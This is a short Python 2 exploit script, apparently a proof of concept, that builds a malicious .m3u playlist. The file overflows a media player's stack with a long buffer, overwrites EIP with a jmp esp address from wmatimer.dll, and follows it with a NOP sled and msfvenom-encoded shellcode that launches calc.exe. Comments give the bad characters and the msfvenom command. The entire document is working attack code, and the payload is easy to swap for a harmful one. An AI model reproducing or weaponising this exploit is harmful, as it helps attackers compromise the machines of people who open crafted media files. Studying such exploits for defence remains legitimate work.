import struct

buffer = "A" * (25000 + 1064)

eip = struct.pack('<I', 0x01D9CD89) #jmp esp from wmatimer.dll

preshellcode = "\x90" * 25

# bad characters: \x00 \x0a

# msfvenom -p windows/exec cmd=calc.exe -f c EXITFUNC=thread -e x86/shikata_ga_nai -b "x00x0a" -a x86 --platform windows

shellcode = ("\xb8\x09\xe5\x15\x5f\xd9\xea\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x31\x31\x46\x13\x03\x46\x13\x83\xc6\x0d\x07\xe0\xa3\xe5\x45"
"\x0b\x5c\xf5\x29\x85\xb9\xc4\x69\xf1\xca\x76\x5a\x71\x9e\x7a"
"\x11\xd7\x0b\x09\x57\xf0\x3c\xba\xd2\x26\x72\x3b\x4e\x1a\x15"
"\xbf\x8d\x4f\xf5\xfe\x5d\x82\xf4\xc7\x80\x6f\xa4\x90\xcf\xc2"
"\x59\x95\x9a\xde\xd2\xe5\x0b\x67\x06\xbd\x2a\x46\x99\xb6\x74"
"\x48\x1b\x1b\x0d\xc1\x03\x78\x28\x9b\xb8\x4a\xc6\x1a\x69\x83"
"\x27\xb0\x54\x2c\xda\xc8\x91\x8a\x05\xbf\xeb\xe9\xb8\xb8\x2f"
"\x90\x66\x4c\xb4\x32\xec\xf6\x10\xc3\x21\x60\xd2\xcf\x8e\xe6"
"\xbc\xd3\x11\x2a\xb7\xef\x9a\xcd\x18\x66\xd8\xe9\xbc\x23\xba"
"\x90\xe5\x89\x6d\xac\xf6\x72\xd1\x08\x7c\x9e\x06\x21\xdf\xf4"
"\xd9\xb7\x65\xba\xda\xc7\x65\xea\xb2\xf6\xee\x65\xc4\x06\x25"
"\xc2\x2a\xe5\xec\x3e\xc3\xb0\x64\x83\x8e\x42\x53\xc7\xb6\xc0"
"\x56\xb7\x4c\xd8\x12\xb2\x09\x5e\xce\xce\x02\x0b\xf0\x7d\x22"
"\x1e\x93\xe0\xb0\xc2\x7a\x87\x30\x60\x83")

with open("eipcrash.m3u", "w+") as f:
	f.write(buffer + eip + preshellcode + shellcode)

print "m3u File Created successfully\n"
	
